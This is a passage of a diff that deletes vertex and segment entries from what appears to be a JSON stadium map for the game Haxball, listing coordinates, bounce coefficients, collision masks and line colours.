-            "x": 381,
-            "y": 240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 381,
-            "y": 256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 381,
-            "y": -240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 381,
-            "y": -256,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 550,
-            "y": -226,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 536,
-            "y": -240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 550,
-            "y": 226,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 536,
-            "y": 240,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 550,
-            "y": 200,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 390,
-            "y": 70,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 550,
-            "y": -200,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 390,
-            "y": -70,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 390,
-            "y": 70,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 390,
-            "y": -70,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": 1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": -1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": 3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": -3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": -2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": 2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": -3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -375,
-            "y": 3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": 1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": -1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": 3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": -3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": -2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": 2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": -3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 375,
-            "y": 3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": 1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": -1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": 3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": -3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": -2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": 2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": -3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": -277.5,
-            "y": 3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": 1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": -1,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": 3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": -3,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": -2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": 2,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": -3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 277.5,
-            "y": 3.5,
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "blueKO"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 81.5,
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 80,
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "x": 8.696301939869894,
-            "y": -21.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 26.088905819609685,
-            "y": -18.91483033464221,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 31.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -26.088905819609685,
-            "y": -18.91483033464221,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -8.696301939869894,
-            "y": -21.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 46.307434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -44.833333333333336,
-            "y": -33.666666666666664,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 44.833333333333336,
-            "y": -33.666666666666664,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 55.00000000000001,
-            "y": -17.666666666666668,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 7.333333333333332,
-            "y": 63.33333333333332,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -8,
-            "y": 63.33333333333333,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -55,
-            "y": -19,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 48.5,
-            "y": -7.5,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 16,
-            "y": 51.5,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -15.333333333333332,
-            "y": 52.833333333333336,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -48.833333333333336,
-            "y": -8.833333333333334,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -34,
-            "y": -31,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 34,
-            "y": -31,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -2.5,
-            "y": 53.807434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -2,
-            "y": 55.807434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 43.32891343843404,
-            "y": -24.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -0.5,
-            "y": 58.807434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 46.32891343843404,
-            "y": -26.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0.5,
-            "y": 50.807434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -39.82891343843404,
-            "y": -22.76298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -3,
-            "y": 51.807434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -45.82891343843404,
-            "y": -25.76298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -1,
-            "y": 51.307434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -42.82891343843404,
-            "y": -24.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -13.5,
-            "y": 55.5,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -51.33333333333333,
-            "y": -9.666666666666668,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 50.247622344939806,
-            "y": -10.827077859628849,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 13.776591618795642,
-            "y": 54.720743559719,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -36.5,
-            "y": -32,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 36,
-            "y": -32.5,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -38.5,
-            "y": -33,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 37.5,
-            "y": -33,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 51.247622344939806,
-            "y": -12.32707785962885,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 12.776591618795642,
-            "y": 57.220743559719,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -13.57545642913032,
-            "y": 57.366529442994405,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -53.68806080584215,
-            "y": -15.91557543219485,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 53,
-            "y": -15.5,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 9.166666666666666,
-            "y": 61.166666666666664,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -10.208639538227883,
-            "y": 60.90200066883591,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -52.47917902425498,
-            "y": -13.66643428564214,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -40.5,
-            "y": -34.5,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 40.5,
-            "y": -34,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 8.696301939869894,
-            "y": -21.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 68.0918947430112,
-            "y": -42.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 79.3533815858876,
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "x": -8.696301939869894,
-            "y": -21.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -68.70078532497217,
-            "y": -42.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 78.9185664888941,
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "x": 0,
-            "y": 46.307434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 61.52596260915432,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -50.0906991736506,
-            "y": -27.61113227451211,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -37.82891343843404,
-            "y": -23.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 40.82891343843404,
-            "y": -23.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 46.307434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 61.52596260915432,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -50.0906991736506,
-            "y": -27.61113227451211,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -37.82891343843404,
-            "y": -23.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -0.8333333333333335,
-            "y": 51.807434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 39.9955801051007,
-            "y": -22.262981304577156,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 46.307434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 37.82891343843404,
-            "y": -23.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 50.0037361542519,
-            "y": -27.61113227451211,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 37.82891343843404,
-            "y": -23.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 50.0037361542519,
-            "y": -27.61113227451211,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 37.82891343843404,
-            "y": -23.26298130457716,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 61.52596260915432,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 46.307434214382,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 64.09189474301121,
-            "y": -40.49632733595109,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -0.6666666666666667,
-            "y": 75.68671491922093,
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "x": 61.0918947430112,
-            "y": -38.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -2.333333333333333,
-            "y": 72.68671491922093,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 59.0918947430112,
-            "y": -39.496327335951094,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -4.333333333333333,
-            "y": 72.02004825255426,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -65.03411865830552,
-            "y": -40.829660669284415,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 2,
-            "y": 76.58523315556077,
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "x": -61.70078532497219,
-            "y": -39.829660669284415,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 3.666666666666667,
-            "y": 74.25189982222744,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -58.70078532497219,
-            "y": -38.49632733595109,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 4.666666666666666,
-            "y": 72.58523315556077,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 26.088905819609685,
-            "y": -18.91483033464221,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 31.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 33.75557248627636,
-            "y": -27.581497001308875,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -2.666666666666667,
-            "y": 39.75557248627636,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 35.75557248627634,
-            "y": -28.248163667975554,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -1.3333333333333337,
-            "y": 41.75557248627635,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 37.08890581960969,
-            "y": -26.581497001308886,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -2.220446049250313e-16,
-            "y": 44.75557248627635,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -0.3333333333333286,
-            "y": 54.666666666666664,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -8.333333333333343,
-            "y": 41.333333333333336,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 0,
-            "y": 35.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -34.75557248627635,
-            "y": -29.248163667975547,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -1.3333333333333335,
-            "y": 38.42223915294302,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -38.088905819609685,
-            "y": -31.248163667975547,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -6,
-            "y": 32.75557248627635,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -40.42223915294303,
-            "y": -32.91483033464221,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -15.029635273203224,
-            "y": -20.75557248627635,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -66.36745199163884,
-            "y": -39.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -20.362968606536562,
-            "y": -19.42223915294302,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -64.36745199163884,
-            "y": -36.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -25.029635273203226,
-            "y": -18.42223915294302,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -62.70078532497217,
-            "y": -33.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 15.36296860653656,
-            "y": -20.75557248627635,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 66.0918947430112,
-            "y": -39.49632733595109,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 20.36296860653656,
-            "y": -19.755572486276353,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 65.75856140967787,
-            "y": -36.82966066928442,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 24.696301939869894,
-            "y": -19.755572486276353,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 61.425228076344524,
-            "y": -34.16299400261776,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 25.029635273203226,
-            "y": -18.755572486276353,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": 59.75856140967787,
-            "y": -32.49632733595108,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -18.029635273203226,
-            "y": -21.088905819609685,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        },
-        {
-            "x": -63.70078532497217,
-            "y": -36.49632733595109,
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {}
-            }
-        }
-    ],
-    "segments": [
-        {
-            "v0": 6,
-            "v1": 7,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "v0": 7,
-            "v1": 8,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "v0": 8,
-            "v1": 9,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "v0": 10,
-            "v1": 11,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "v0": 11,
-            "v1": 12,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "v0": 12,
-            "v1": 13,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue",
-                "ball"
-            ]
-        },
-        {
-            "v0": 2,
-            "v1": 3,
-            "vis": false,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "v0": 3,
-            "v1": 4,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.15,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "blueKO"
-            ],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 4,
-            "v1": 3,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.15,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO"
-            ],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 4,
-            "v1": 5,
-            "vis": false,
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "v0": 14,
-            "v1": 15,
-            "color": "F8F8F8",
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 16,
-            "v1": 17,
-            "color": "F8F8F8",
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 18,
-            "v1": 19,
-            "color": "F8F8F8",
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 20,
-            "v1": 21,
-            "color": "F8F8F8",
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 22,
-            "v1": 23,
-            "color": "F8F8F8",
-            "bCoef": 1.15,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 24,
-            "v1": 25,
-            "color": "F8F8F8",
-            "bCoef": 0,
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 26,
-            "v1": 27,
-            "color": "F8F8F8",
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 28,
-            "v1": 29,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "v0": 30,
-            "v1": 31,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [
-                "red",
-                "blue"
-            ],
-            "cGroup": [
-                "redKO",
-                "blueKO"
-            ]
-        },
-        {
-            "v0": 38,
-            "v1": 39,
-            "vis": false,
-            "color": "F8F8F8",
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 40,
-            "v1": 41,
-            "vis": false,
-            "color": "F8F8F8",
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 42,
-            "v1": 43,
-            "vis": false,
-            "color": "F8F8F8",
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 44,
-            "v1": 45,
-            "vis": false,
-            "color": "F8F8F8",
-            "cMask": [
-                "ball"
-            ]
-        },
-        {
-            "v0": 46,
-            "v1": 47,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 48,
-            "v1": 49,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 50,
-            "v1": 51,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 64,
-            "v1": 65,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 67,
-            "v1": 66,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 68,
-            "v1": 69,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 70,
-            "v1": 71,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 67,
-            "v1": 71,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 73,
-            "v1": 72,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 74,
-            "v1": 75,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 76,
-            "v1": 77,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 78,
-            "v1": 79,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 80,
-            "v1": 81,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 82,
-            "v1": 83,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 84,
-            "v1": 85,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 86,
-            "v1": 87,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 88,
-            "v1": 89,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 91,
-            "v1": 90,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
